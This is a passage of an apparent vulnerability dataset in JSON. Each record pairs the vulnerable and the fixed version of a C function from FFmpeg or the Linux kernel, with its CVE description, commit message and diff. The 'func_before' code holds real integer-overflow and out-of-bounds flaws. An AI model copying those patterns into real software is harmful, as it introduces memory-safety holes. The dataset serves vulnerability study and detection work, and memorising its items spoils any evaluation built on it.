                "\t\tif (skb->mac_header < (tnl_hlen + frag_hdr_sz)) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-0876",
        "func_name": "ffmpeg/old_codec47",
        "description": "Multiple integer overflows in the (1) old_codec37 and (2) old_codec47 functions in libavcodec/sanm.c in FFmpeg before 1.1.3 allow remote attackers to have an unspecified impact via crafted LucasArts Smush data, which triggers an out-of-bounds array access.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=5260edee7e5bd975837696c8c8c1a80eb2fbd7c1",
        "commit_title": "",
        "commit_text": "sanm: Use the correct height variable in the decoded_size checks  Fixes integer overflow and out of array accesses  ",
        "func_before": "static int old_codec47(SANMVideoContext *ctx, int top,\n                       int left, int width, int height)\n{\n    int i, j, seq, compr, new_rot, tbl_pos, skip;\n    int stride     = ctx->pitch;\n    uint8_t *dst   = ((uint8_t*)ctx->frm0) + left + top * stride;\n    uint8_t *prev1 = (uint8_t*)ctx->frm1;\n    uint8_t *prev2 = (uint8_t*)ctx->frm2;\n    uint32_t decoded_size;\n\n    tbl_pos = bytestream2_tell(&ctx->gb);\n    seq     = bytestream2_get_le16(&ctx->gb);\n    compr   = bytestream2_get_byte(&ctx->gb);\n    new_rot = bytestream2_get_byte(&ctx->gb);\n    skip    = bytestream2_get_byte(&ctx->gb);\n    bytestream2_skip(&ctx->gb, 9);\n    decoded_size = bytestream2_get_le32(&ctx->gb);\n    bytestream2_skip(&ctx->gb, 8);\n\n    if (decoded_size > height * stride - left - top * stride) {\n        decoded_size = height * stride - left - top * stride;\n        av_log(ctx->avctx, AV_LOG_WARNING, \"decoded size is too large\\n\");\n    }\n\n    if (skip & 1)\n        bytestream2_skip(&ctx->gb, 0x8080);\n    if (!seq) {\n        ctx->prev_seq = -1;\n        memset(prev1, 0, ctx->height * stride);\n        memset(prev2, 0, ctx->height * stride);\n    }\n    av_dlog(ctx->avctx, \"compression %d\\n\", compr);\n    switch (compr) {\n    case 0:\n        if (bytestream2_get_bytes_left(&ctx->gb) < width * height)\n            return AVERROR_INVALIDDATA;\n        for (j = 0; j < height; j++) {\n            bytestream2_get_bufferu(&ctx->gb, dst, width);\n            dst += stride;\n        }\n        break;\n    case 1:\n        if (bytestream2_get_bytes_left(&ctx->gb) < ((width + 1) >> 1) * ((height + 1) >> 1))\n            return AVERROR_INVALIDDATA;\n        for (j = 0; j < height; j += 2) {\n            for (i = 0; i < width; i += 2) {\n                dst[i] = dst[i + 1] =\n                dst[stride + i] = dst[stride + i + 1] = bytestream2_get_byteu(&ctx->gb);\n            }\n            dst += stride * 2;\n        }\n        break;\n    case 2:\n        if (seq == ctx->prev_seq + 1) {\n            for (j = 0; j < height; j += 8) {\n                for (i = 0; i < width; i += 8) {\n                    if (process_block(ctx, dst + i, prev1 + i, prev2 + i, stride,\n                                      tbl_pos + 8, 8))\n                        return AVERROR_INVALIDDATA;\n                }\n                dst   += stride * 8;\n                prev1 += stride * 8;\n                prev2 += stride * 8;\n            }\n        }\n        break;\n    case 3:\n        memcpy(ctx->frm0, ctx->frm2, ctx->pitch * ctx->height);\n        break;\n    case 4:\n        memcpy(ctx->frm0, ctx->frm1, ctx->pitch * ctx->height);\n        break;\n    case 5:\n        if (rle_decode(ctx, dst, decoded_size))\n            return AVERROR_INVALIDDATA;\n        break;\n    default:\n        av_log(ctx->avctx, AV_LOG_ERROR,\n               \"subcodec 47 compression %d not implemented\\n\", compr);\n        return AVERROR_PATCHWELCOME;\n    }\n    if (seq == ctx->prev_seq + 1)\n        ctx->rotate_code = new_rot;\n    else\n        ctx->rotate_code = 0;\n    ctx->prev_seq = seq;\n\n    return 0;\n}",
        "func": "static int old_codec47(SANMVideoContext *ctx, int top,\n                       int left, int width, int height)\n{\n    int i, j, seq, compr, new_rot, tbl_pos, skip;\n    int stride     = ctx->pitch;\n    uint8_t *dst   = ((uint8_t*)ctx->frm0) + left + top * stride;\n    uint8_t *prev1 = (uint8_t*)ctx->frm1;\n    uint8_t *prev2 = (uint8_t*)ctx->frm2;\n    uint32_t decoded_size;\n\n    tbl_pos = bytestream2_tell(&ctx->gb);\n    seq     = bytestream2_get_le16(&ctx->gb);\n    compr   = bytestream2_get_byte(&ctx->gb);\n    new_rot = bytestream2_get_byte(&ctx->gb);\n    skip    = bytestream2_get_byte(&ctx->gb);\n    bytestream2_skip(&ctx->gb, 9);\n    decoded_size = bytestream2_get_le32(&ctx->gb);\n    bytestream2_skip(&ctx->gb, 8);\n\n    if (decoded_size > ctx->height * stride - left - top * stride) {\n        decoded_size = ctx->height * stride - left - top * stride;\n        av_log(ctx->avctx, AV_LOG_WARNING, \"decoded size is too large\\n\");\n    }\n\n    if (skip & 1)\n        bytestream2_skip(&ctx->gb, 0x8080);\n    if (!seq) {\n        ctx->prev_seq = -1;\n        memset(prev1, 0, ctx->height * stride);\n        memset(prev2, 0, ctx->height * stride);\n    }\n    av_dlog(ctx->avctx, \"compression %d\\n\", compr);\n    switch (compr) {\n    case 0:\n        if (bytestream2_get_bytes_left(&ctx->gb) < width * height)\n            return AVERROR_INVALIDDATA;\n        for (j = 0; j < height; j++) {\n            bytestream2_get_bufferu(&ctx->gb, dst, width);\n            dst += stride;\n        }\n        break;\n    case 1:\n        if (bytestream2_get_bytes_left(&ctx->gb) < ((width + 1) >> 1) * ((height + 1) >> 1))\n            return AVERROR_INVALIDDATA;\n        for (j = 0; j < height; j += 2) {\n            for (i = 0; i < width; i += 2) {\n                dst[i] = dst[i + 1] =\n                dst[stride + i] = dst[stride + i + 1] = bytestream2_get_byteu(&ctx->gb);\n            }\n            dst += stride * 2;\n        }\n        break;\n    case 2:\n        if (seq == ctx->prev_seq + 1) {\n            for (j = 0; j < height; j += 8) {\n                for (i = 0; i < width; i += 8) {\n                    if (process_block(ctx, dst + i, prev1 + i, prev2 + i, stride,\n                                      tbl_pos + 8, 8))\n                        return AVERROR_INVALIDDATA;\n                }\n                dst   += stride * 8;\n                prev1 += stride * 8;\n                prev2 += stride * 8;\n            }\n        }\n        break;\n    case 3:\n        memcpy(ctx->frm0, ctx->frm2, ctx->pitch * ctx->height);\n        break;\n    case 4:\n        memcpy(ctx->frm0, ctx->frm1, ctx->pitch * ctx->height);\n        break;\n    case 5:\n        if (rle_decode(ctx, dst, decoded_size))\n            return AVERROR_INVALIDDATA;\n        break;\n    default:\n        av_log(ctx->avctx, AV_LOG_ERROR,\n               \"subcodec 47 compression %d not implemented\\n\", compr);\n        return AVERROR_PATCHWELCOME;\n    }\n    if (seq == ctx->prev_seq + 1)\n        ctx->rotate_code = new_rot;\n    else\n        ctx->rotate_code = 0;\n    ctx->prev_seq = seq;\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -17,8 +17,8 @@\n     decoded_size = bytestream2_get_le32(&ctx->gb);\n     bytestream2_skip(&ctx->gb, 8);\n \n-    if (decoded_size > height * stride - left - top * stride) {\n-        decoded_size = height * stride - left - top * stride;\n+    if (decoded_size > ctx->height * stride - left - top * stride) {\n+        decoded_size = ctx->height * stride - left - top * stride;\n         av_log(ctx->avctx, AV_LOG_WARNING, \"decoded size is too large\\n\");\n     }\n ",
        "diff_line_info": {
            "deleted_lines": [
                "    if (decoded_size > height * stride - left - top * stride) {",
                "        decoded_size = height * stride - left - top * stride;"
            ],
            "added_lines": [
                "    if (decoded_size > ctx->height * stride - left - top * stride) {",
                "        decoded_size = ctx->height * stride - left - top * stride;"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-0876",
        "func_name": "ffmpeg/old_codec37",
        "description": "Multiple integer overflows in the (1) old_codec37 and (2) old_codec47 functions in libavcodec/sanm.c in FFmpeg before 1.1.3 allow remote attackers to have an unspecified impact via crafted LucasArts Smush data, which triggers an out-of-bounds array access.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=5260edee7e5bd975837696c8c8c1a80eb2fbd7c1",
        "commit_title": "",
        "commit_text": "sanm: Use the correct height variable in the decoded_size checks  Fixes integer overflow and out of array accesses  ",
        "func_before": "static int old_codec37(SANMVideoContext *ctx, int top,\n                       int left, int width, int height)\n{\n    int stride = ctx->pitch;\n    int i, j, k, t;\n    int skip_run = 0;\n    int compr, mvoff, seq, flags;\n    uint32_t decoded_size;\n    uint8_t *dst, *prev;\n\n    compr        = bytestream2_get_byte(&ctx->gb);\n    mvoff        = bytestream2_get_byte(&ctx->gb);\n    seq          = bytestream2_get_le16(&ctx->gb);\n    decoded_size = bytestream2_get_le32(&ctx->gb);\n    bytestream2_skip(&ctx->gb, 4);\n    flags        = bytestream2_get_byte(&ctx->gb);\n    bytestream2_skip(&ctx->gb, 3);\n\n    if (decoded_size > height * stride - left - top * stride) {\n        decoded_size = height * stride - left - top * stride;\n        av_log(ctx->avctx, AV_LOG_WARNING, \"decoded size is too large\\n\");\n    }\n\n    ctx->rotate_code = 0;\n\n    if (((seq & 1) || !(flags & 1)) && (compr && compr != 2))\n        rotate_bufs(ctx, 1);\n\n    dst  = ((uint8_t*)ctx->frm0) + left + top * stride;\n    prev = ((uint8_t*)ctx->frm2) + left + top * stride;\n\n    if (mvoff > 2) {\n        av_log(ctx->avctx, AV_LOG_ERROR, \"invalid motion base value %d\\n\", mvoff);\n        return AVERROR_INVALIDDATA;\n    }\n    av_dlog(ctx->avctx, \"compression %d\\n\", compr);\n    switch (compr) {\n    case 0:\n        for (i = 0; i < height; i++) {\n            bytestream2_get_buffer(&ctx->gb, dst, width);\n            dst += stride;\n        }\n        memset(ctx->frm1, 0, ctx->height * stride);\n        memset(ctx->frm2, 0, ctx->height * stride);\n        break;\n    case 2:\n        if (rle_decode(ctx, dst, decoded_size))\n            return AVERROR_INVALIDDATA;\n        memset(ctx->frm1, 0, ctx->frm1_size);\n        memset(ctx->frm2, 0, ctx->frm2_size);\n        break;\n    case 3:\n    case 4:\n        if (flags & 4) {\n            for (j = 0; j < height; j += 4) {\n                for (i = 0; i < width; i += 4) {\n                    int code;\n                    if (skip_run) {\n                        skip_run--;\n                        copy_block4(dst + i, prev + i, stride, stride, 4);\n                        continue;\n                    }\n                    if (bytestream2_get_bytes_left(&ctx->gb) < 1)\n                        return AVERROR_INVALIDDATA;\n                    code = bytestream2_get_byteu(&ctx->gb);\n                    switch (code) {\n                    case 0xFF:\n                        if (bytestream2_get_bytes_left(&ctx->gb) < 16)\n                            return AVERROR_INVALIDDATA;\n                        for (k = 0; k < 4; k++)\n                            bytestream2_get_bufferu(&ctx->gb, dst + i + k * stride, 4);\n                        break;\n                    case 0xFE:\n                        if (bytestream2_get_bytes_left(&ctx->gb) < 4)\n                            return AVERROR_INVALIDDATA;\n                        for (k = 0; k < 4; k++)\n                            memset(dst + i + k * stride, bytestream2_get_byteu(&ctx->gb), 4);\n                        break;\n                    case 0xFD:\n                        if (bytestream2_get_bytes_left(&ctx->gb) < 1)\n                            return AVERROR_INVALIDDATA;\n                        t = bytestream2_get_byteu(&ctx->gb);\n                        for (k = 0; k < 4; k++)\n                            memset(dst + i + k * stride, t, 4);\n                        break;\n                    default:\n                        if (compr == 4 && !code) {\n                            if (bytestream2_get_bytes_left(&ctx->gb) < 1)\n                                return AVERROR_INVALIDDATA;\n                            skip_run = bytestream2_get_byteu(&ctx->gb) + 1;\n                            i -= 4;\n                        } else {\n                            int mx, my;\n\n                            mx = c37_mv[(mvoff * 255 + code) * 2    ];\n                            my = c37_mv[(mvoff * 255 + code) * 2 + 1];\n                            codec37_mv(dst + i, prev + i + mx + my * stride,\n                                       ctx->height, stride, i + mx, j + my);\n                        }\n                    }\n                }\n                dst  += stride * 4;\n                prev += stride * 4;\n            }\n        } else {\n            for (j = 0; j < height; j += 4) {\n                for (i = 0; i < width; i += 4) {\n                    int code;\n                    if (skip_run) {\n                        skip_run--;\n                        copy_block4(dst + i, prev + i, stride, stride, 4);\n                        continue;\n                    }\n                    code = bytestream2_get_byte(&ctx->gb);\n                    if (code == 0xFF) {\n                        if (bytestream2_get_bytes_left(&ctx->gb) < 16)\n                            return AVERROR_INVALIDDATA;\n                        for (k = 0; k < 4; k++)\n                            bytestream2_get_bufferu(&ctx->gb, dst + i + k * stride, 4);\n                    } else if (compr == 4 && !code) {\n                        if (bytestream2_get_bytes_left(&ctx->gb) < 1)\n                            return AVERROR_INVALIDDATA;\n                        skip_run = bytestream2_get_byteu(&ctx->gb) + 1;\n                        i -= 4;\n                    } else {\n                        int mx, my;\n\n                        mx = c37_mv[(mvoff * 255 + code) * 2];\n                        my = c37_mv[(mvoff * 255 + code) * 2 + 1];\n                        codec37_mv(dst + i, prev + i + mx + my * stride,\n                                   ctx->height, stride, i + mx, j + my);\n                    }\n                }\n                dst  += stride * 4;\n                prev += stride * 4;\n            }\n        }\n        break;\n    default:\n        av_log(ctx->avctx, AV_LOG_ERROR,\n               \"subcodec 37 compression %d not implemented\\n\", compr);\n        return AVERROR_PATCHWELCOME;\n    }\n\n    return 0;\n}",
        "func": "static int old_codec37(SANMVideoContext *ctx, int top,\n                       int left, int width, int height)\n{\n    int stride = ctx->pitch;\n    int i, j, k, t;\n    int skip_run = 0;\n    int compr, mvoff, seq, flags;\n    uint32_t decoded_size;\n    uint8_t *dst, *prev;\n\n    compr        = bytestream2_get_byte(&ctx->gb);\n    mvoff        = bytestream2_get_byte(&ctx->gb);\n    seq          = bytestream2_get_le16(&ctx->gb);\n    decoded_size = bytestream2_get_le32(&ctx->gb);\n    bytestream2_skip(&ctx->gb, 4);\n    flags        = bytestream2_get_byte(&ctx->gb);\n    bytestream2_skip(&ctx->gb, 3);\n\n    if (decoded_size > ctx->height * stride - left - top * stride) {\n        decoded_size = ctx->height * stride - left - top * stride;\n        av_log(ctx->avctx, AV_LOG_WARNING, \"decoded size is too large\\n\");\n    }\n\n    ctx->rotate_code = 0;\n\n    if (((seq & 1) || !(flags & 1)) && (compr && compr != 2))\n        rotate_bufs(ctx, 1);\n\n    dst  = ((uint8_t*)ctx->frm0) + left + top * stride;\n    prev = ((uint8_t*)ctx->frm2) + left + top * stride;\n\n    if (mvoff > 2) {\n        av_log(ctx->avctx, AV_LOG_ERROR, \"invalid motion base value %d\\n\", mvoff);\n        return AVERROR_INVALIDDATA;\n    }\n    av_dlog(ctx->avctx, \"compression %d\\n\", compr);\n    switch (compr) {\n    case 0:\n        for (i = 0; i < height; i++) {\n            bytestream2_get_buffer(&ctx->gb, dst, width);\n            dst += stride;\n        }\n        memset(ctx->frm1, 0, ctx->height * stride);\n        memset(ctx->frm2, 0, ctx->height * stride);\n        break;\n    case 2:\n        if (rle_decode(ctx, dst, decoded_size))\n            return AVERROR_INVALIDDATA;\n        memset(ctx->frm1, 0, ctx->frm1_size);\n        memset(ctx->frm2, 0, ctx->frm2_size);\n        break;\n    case 3:\n    case 4:\n        if (flags & 4) {\n            for (j = 0; j < height; j += 4) {\n                for (i = 0; i < width; i += 4) {\n                    int code;\n                    if (skip_run) {\n                        skip_run--;\n                        copy_block4(dst + i, prev + i, stride, stride, 4);\n                        continue;\n                    }\n                    if (bytestream2_get_bytes_left(&ctx->gb) < 1)\n                        return AVERROR_INVALIDDATA;\n                    code = bytestream2_get_byteu(&ctx->gb);\n                    switch (code) {\n                    case 0xFF:\n                        if (bytestream2_get_bytes_left(&ctx->gb) < 16)\n                            return AVERROR_INVALIDDATA;\n                        for (k = 0; k < 4; k++)\n                            bytestream2_get_bufferu(&ctx->gb, dst + i + k * stride, 4);\n                        break;\n                    case 0xFE:\n                        if (bytestream2_get_bytes_left(&ctx->gb) < 4)\n                            return AVERROR_INVALIDDATA;\n                        for (k = 0; k < 4; k++)\n                            memset(dst + i + k * stride, bytestream2_get_byteu(&ctx->gb), 4);\n                        break;\n                    case 0xFD:\n                        if (bytestream2_get_bytes_left(&ctx->gb) < 1)\n                            return AVERROR_INVALIDDATA;\n                        t = bytestream2_get_byteu(&ctx->gb);\n                        for (k = 0; k < 4; k++)\n                            memset(dst + i + k * stride, t, 4);\n                        break;\n                    default:\n                        if (compr == 4 && !code) {\n                            if (bytestream2_get_bytes_left(&ctx->gb) < 1)\n                                return AVERROR_INVALIDDATA;\n                            skip_run = bytestream2_get_byteu(&ctx->gb) + 1;\n                            i -= 4;\n                        } else {\n                            int mx, my;\n\n                            mx = c37_mv[(mvoff * 255 + code) * 2    ];\n                            my = c37_mv[(mvoff * 255 + code) * 2 + 1];\n                            codec37_mv(dst + i, prev + i + mx + my * stride,\n                                       ctx->height, stride, i + mx, j + my);\n                        }\n                    }\n                }\n                dst  += stride * 4;\n                prev += stride * 4;\n            }\n        } else {\n            for (j = 0; j < height; j += 4) {\n                for (i = 0; i < width; i += 4) {\n                    int code;\n                    if (skip_run) {\n                        skip_run--;\n                        copy_block4(dst + i, prev + i, stride, stride, 4);\n                        continue;\n                    }\n                    code = bytestream2_get_byte(&ctx->gb);\n                    if (code == 0xFF) {\n                        if (bytestream2_get_bytes_left(&ctx->gb) < 16)\n                            return AVERROR_INVALIDDATA;\n                        for (k = 0; k < 4; k++)\n                            bytestream2_get_bufferu(&ctx->gb, dst + i + k * stride, 4);\n                    } else if (compr == 4 && !code) {\n                        if (bytestream2_get_bytes_left(&ctx->gb) < 1)\n                            return AVERROR_INVALIDDATA;\n                        skip_run = bytestream2_get_byteu(&ctx->gb) + 1;\n                        i -= 4;\n                    } else {\n                        int mx, my;\n\n                        mx = c37_mv[(mvoff * 255 + code) * 2];\n                        my = c37_mv[(mvoff * 255 + code) * 2 + 1];\n                        codec37_mv(dst + i, prev + i + mx + my * stride,\n                                   ctx->height, stride, i + mx, j + my);\n                    }\n                }\n                dst  += stride * 4;\n                prev += stride * 4;\n            }\n        }\n        break;\n    default:\n        av_log(ctx->avctx, AV_LOG_ERROR,\n               \"subcodec 37 compression %d not implemented\\n\", compr);\n        return AVERROR_PATCHWELCOME;\n    }\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -16,8 +16,8 @@\n     flags        = bytestream2_get_byte(&ctx->gb);\n     bytestream2_skip(&ctx->gb, 3);\n \n-    if (decoded_size > height * stride - left - top * stride) {\n-        decoded_size = height * stride - left - top * stride;\n+    if (decoded_size > ctx->height * stride - left - top * stride) {\n+        decoded_size = ctx->height * stride - left - top * stride;\n         av_log(ctx->avctx, AV_LOG_WARNING, \"decoded size is too large\\n\");\n     }\n ",
        "diff_line_info": {
            "deleted_lines": [
                "    if (decoded_size > height * stride - left - top * stride) {",
                "        decoded_size = height * stride - left - top * stride;"
            ],
            "added_lines": [
                "    if (decoded_size > ctx->height * stride - left - top * stride) {",
                "        decoded_size = ctx->height * stride - left - top * stride;"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-0862",
        "func_name": "ffmpeg/process_frame_obj",
        "description": "Multiple integer overflows in the process_frame_obj function in libavcodec/sanm.c in FFmpeg before 1.1.2 allow remote attackers to have an unspecified impact via crafted image dimensions in LucasArts Smush video data, which triggers an out-of-bounds array access.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=f4fb841ad13bab66d4fb0c7ff2a94770df7815d8",
        "commit_title": "",
        "commit_text": "sanm: check image dimensions before using them  Avoids integer overflows and out of array accesses.  (cherry picked from commit 49b729d3af8464de431362e6c5b3027102bc2f88)  ",
        "func_before": "static int process_frame_obj(SANMVideoContext *ctx)\n{\n    uint16_t codec, top, left, w, h;\n\n    codec = bytestream2_get_le16u(&ctx->gb);\n    left  = bytestream2_get_le16u(&ctx->gb);\n    top   = bytestream2_get_le16u(&ctx->gb);\n    w     = bytestream2_get_le16u(&ctx->gb);\n    h     = bytestream2_get_le16u(&ctx->gb);\n\n    if (ctx->width < left + w || ctx->height < top + h) {\n        ctx->avctx->width  = FFMAX(left + w, ctx->width);\n        ctx->avctx->height = FFMAX(top + h, ctx->height);\n        init_sizes(ctx, left + w, top + h);\n        if (init_buffers(ctx)) {\n            av_log(ctx->avctx, AV_LOG_ERROR, \"error resizing buffers\\n\");\n            return AVERROR(ENOMEM);\n        }\n    }\n    bytestream2_skip(&ctx->gb, 4);\n\n    av_dlog(ctx->avctx, \"subcodec %d\\n\", codec);\n    switch (codec) {\n    case 1:\n    case 3:\n        return old_codec1(ctx, top, left, w, h);\n        break;\n    case 37:\n        return old_codec37(ctx, top, left, w, h);\n        break;\n    case 47:\n        return old_codec47(ctx, top, left, w, h);\n        break;\n    default:\n        av_log_ask_for_sample(ctx->avctx, \"unknown subcodec %d\\n\", codec);\n        return AVERROR_PATCHWELCOME;\n    }\n}",
        "func": "static int process_frame_obj(SANMVideoContext *ctx)\n{\n    uint16_t codec, top, left, w, h;\n\n    codec = bytestream2_get_le16u(&ctx->gb);\n    left  = bytestream2_get_le16u(&ctx->gb);\n    top   = bytestream2_get_le16u(&ctx->gb);\n    w     = bytestream2_get_le16u(&ctx->gb);\n    h     = bytestream2_get_le16u(&ctx->gb);\n\n    if (ctx->width < left + w || ctx->height < top + h) {\n        if (av_image_check_size(FFMAX(left + w, ctx->width),\n                                FFMAX(top  + h, ctx->height), 0, ctx->avctx) < 0)\n            return AVERROR_INVALIDDATA;\n        avcodec_set_dimensions(ctx->avctx, FFMAX(left + w, ctx->width),\n                                           FFMAX(top  + h, ctx->height));\n        init_sizes(ctx, left + w, top + h);\n        if (init_buffers(ctx)) {\n            av_log(ctx->avctx, AV_LOG_ERROR, \"error resizing buffers\\n\");\n            return AVERROR(ENOMEM);\n        }\n    }\n    bytestream2_skip(&ctx->gb, 4);\n\n    av_dlog(ctx->avctx, \"subcodec %d\\n\", codec);\n    switch (codec) {\n    case 1:\n    case 3:\n        return old_codec1(ctx, top, left, w, h);\n        break;\n    case 37:\n        return old_codec37(ctx, top, left, w, h);\n        break;\n    case 47:\n        return old_codec47(ctx, top, left, w, h);\n        break;\n    default:\n        av_log_ask_for_sample(ctx->avctx, \"unknown subcodec %d\\n\", codec);\n        return AVERROR_PATCHWELCOME;\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -9,8 +9,11 @@\n     h     = bytestream2_get_le16u(&ctx->gb);\n \n     if (ctx->width < left + w || ctx->height < top + h) {\n-        ctx->avctx->width  = FFMAX(left + w, ctx->width);\n-        ctx->avctx->height = FFMAX(top + h, ctx->height);\n+        if (av_image_check_size(FFMAX(left + w, ctx->width),\n+                                FFMAX(top  + h, ctx->height), 0, ctx->avctx) < 0)\n+            return AVERROR_INVALIDDATA;\n+        avcodec_set_dimensions(ctx->avctx, FFMAX(left + w, ctx->width),\n+                                           FFMAX(top  + h, ctx->height));\n         init_sizes(ctx, left + w, top + h);\n         if (init_buffers(ctx)) {\n             av_log(ctx->avctx, AV_LOG_ERROR, \"error resizing buffers\\n\");",
        "diff_line_info": {
            "deleted_lines": [
                "        ctx->avctx->width  = FFMAX(left + w, ctx->width);",
                "        ctx->avctx->height = FFMAX(top + h, ctx->height);"
            ],
            "added_lines": [
                "        if (av_image_check_size(FFMAX(left + w, ctx->width),",
                "                                FFMAX(top  + h, ctx->height), 0, ctx->avctx) < 0)",
                "            return AVERROR_INVALIDDATA;",
                "        avcodec_set_dimensions(ctx->avctx, FFMAX(left + w, ctx->width),",
                "                                           FFMAX(top  + h, ctx->height));"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-0864",
        "func_name": "ffmpeg/gif_copy_img_rect",
        "description": "The gif_copy_img_rect function in libavcodec/gifdec.c in FFmpeg before 1.1.2 performs an incorrect calculation for an \"end pointer,\" which allows remote attackers to have an unspecified impact via crafted GIF data that triggers an out-of-bounds array access.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=9547034f9120187e23ad76424dd4d70247e62212",
        "commit_title": "",
        "commit_text": "gifdec: gif_copy_img_rect: Fix end pointer  Fixes out of array accesses  (cherry picked from commit c10350358da58600884292c08a8690289b81de29)  ",
        "func_before": "static void gif_copy_img_rect(const uint32_t *src, uint32_t *dst,\n                              int linesize, int l, int t, int w, int h)\n{\n    const int y_start = t * linesize;\n    const uint32_t *src_px, *src_pr,\n                   *src_py = src + y_start,\n                   *dst_py = dst + y_start;\n    const uint32_t *src_pb = src_py + t * linesize;\n    uint32_t *dst_px;\n\n    for (; src_py < src_pb; src_py += linesize, dst_py += linesize) {\n        src_px = src_py + l;\n        dst_px = (uint32_t *)dst_py + l;\n        src_pr = src_px + w;\n\n        for (; src_px < src_pr; src_px++, dst_px++)\n            *dst_px = *src_px;\n    }\n}",
        "func": "static void gif_copy_img_rect(const uint32_t *src, uint32_t *dst,\n                              int linesize, int l, int t, int w, int h)\n{\n    const int y_start = t * linesize;\n    const uint32_t *src_px, *src_pr,\n                   *src_py = src + y_start,\n                   *dst_py = dst + y_start;\n    const uint32_t *src_pb = src_py + h * linesize;\n    uint32_t *dst_px;\n\n    for (; src_py < src_pb; src_py += linesize, dst_py += linesize) {\n        src_px = src_py + l;\n        dst_px = (uint32_t *)dst_py + l;\n        src_pr = src_px + w;\n\n        for (; src_px < src_pr; src_px++, dst_px++)\n            *dst_px = *src_px;\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,7 +5,7 @@\n     const uint32_t *src_px, *src_pr,\n                    *src_py = src + y_start,\n                    *dst_py = dst + y_start;\n-    const uint32_t *src_pb = src_py + t * linesize;\n+    const uint32_t *src_pb = src_py + h * linesize;\n     uint32_t *dst_px;\n \n     for (; src_py < src_pb; src_py += linesize, dst_py += linesize) {",
        "diff_line_info": {
            "deleted_lines": [
                "    const uint32_t *src_pb = src_py + t * linesize;"
            ],
            "added_lines": [
                "    const uint32_t *src_pb = src_py + h * linesize;"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-6378",
        "func_name": "torvalds/linux/lbs_debugfs_write",
        "description": "The lbs_debugfs_write function in drivers/net/wireless/libertas/debugfs.c in the Linux kernel through 3.12.1 allows local users to cause a denial of service (OOPS) by leveraging root privileges for a zero-length write operation.",
        "git_url": "https://github.com/torvalds/linux/commit/a497e47d4aec37aaf8f13509f3ef3d1f6a717d88",
        "commit_title": "libertas: potential oops in debugfs",
        "commit_text": " If we do a zero size allocation then it will oops.  Also we can't be sure the user passes us a NUL terminated string so I've added a terminator.  This code can only be triggered by root. ",
        "func_before": "static ssize_t lbs_debugfs_write(struct file *f, const char __user *buf,\n\t\t\t    size_t cnt, loff_t *ppos)\n{\n\tint r, i;\n\tchar *pdata;\n\tchar *p;\n\tchar *p0;\n\tchar *p1;\n\tchar *p2;\n\tstruct debug_data *d = f->private_data;\n\n\tpdata = kmalloc(cnt, GFP_KERNEL);\n\tif (pdata == NULL)\n\t\treturn 0;\n\n\tif (copy_from_user(pdata, buf, cnt)) {\n\t\tlbs_deb_debugfs(\"Copy from user failed\\n\");\n\t\tkfree(pdata);\n\t\treturn 0;\n\t}\n\n\tp0 = pdata;\n\tfor (i = 0; i < num_of_items; i++) {\n\t\tdo {\n\t\t\tp = strstr(p0, d[i].name);\n\t\t\tif (p == NULL)\n\t\t\t\tbreak;\n\t\t\tp1 = strchr(p, '\\n');\n\t\t\tif (p1 == NULL)\n\t\t\t\tbreak;\n\t\t\tp0 = p1++;\n\t\t\tp2 = strchr(p, '=');\n\t\t\tif (!p2)\n\t\t\t\tbreak;\n\t\t\tp2++;\n\t\t\tr = simple_strtoul(p2, NULL, 0);\n\t\t\tif (d[i].size == 1)\n\t\t\t\t*((u8 *) d[i].addr) = (u8) r;\n\t\t\telse if (d[i].size == 2)\n\t\t\t\t*((u16 *) d[i].addr) = (u16) r;\n\t\t\telse if (d[i].size == 4)\n\t\t\t\t*((u32 *) d[i].addr) = (u32) r;\n\t\t\telse if (d[i].size == 8)\n\t\t\t\t*((u64 *) d[i].addr) = (u64) r;\n\t\t\tbreak;\n\t\t} while (1);\n\t}\n\tkfree(pdata);\n\n\treturn (ssize_t)cnt;\n}",
        "func": "static ssize_t lbs_debugfs_write(struct file *f, const char __user *buf,\n\t\t\t    size_t cnt, loff_t *ppos)\n{\n\tint r, i;\n\tchar *pdata;\n\tchar *p;\n\tchar *p0;\n\tchar *p1;\n\tchar *p2;\n\tstruct debug_data *d = f->private_data;\n\n\tif (cnt == 0)\n\t\treturn 0;\n\n\tpdata = kmalloc(cnt + 1, GFP_KERNEL);\n\tif (pdata == NULL)\n\t\treturn 0;\n\n\tif (copy_from_user(pdata, buf, cnt)) {\n\t\tlbs_deb_debugfs(\"Copy from user failed\\n\");\n\t\tkfree(pdata);\n\t\treturn 0;\n\t}\n\tpdata[cnt] = '\\0';\n\n\tp0 = pdata;\n\tfor (i = 0; i < num_of_items; i++) {\n\t\tdo {\n\t\t\tp = strstr(p0, d[i].name);\n\t\t\tif (p == NULL)\n\t\t\t\tbreak;\n\t\t\tp1 = strchr(p, '\\n');\n\t\t\tif (p1 == NULL)\n\t\t\t\tbreak;\n\t\t\tp0 = p1++;\n\t\t\tp2 = strchr(p, '=');\n\t\t\tif (!p2)\n\t\t\t\tbreak;\n\t\t\tp2++;\n\t\t\tr = simple_strtoul(p2, NULL, 0);\n\t\t\tif (d[i].size == 1)\n\t\t\t\t*((u8 *) d[i].addr) = (u8) r;\n\t\t\telse if (d[i].size == 2)\n\t\t\t\t*((u16 *) d[i].addr) = (u16) r;\n\t\t\telse if (d[i].size == 4)\n\t\t\t\t*((u32 *) d[i].addr) = (u32) r;\n\t\t\telse if (d[i].size == 8)\n\t\t\t\t*((u64 *) d[i].addr) = (u64) r;\n\t\t\tbreak;\n\t\t} while (1);\n\t}\n\tkfree(pdata);\n\n\treturn (ssize_t)cnt;\n}",
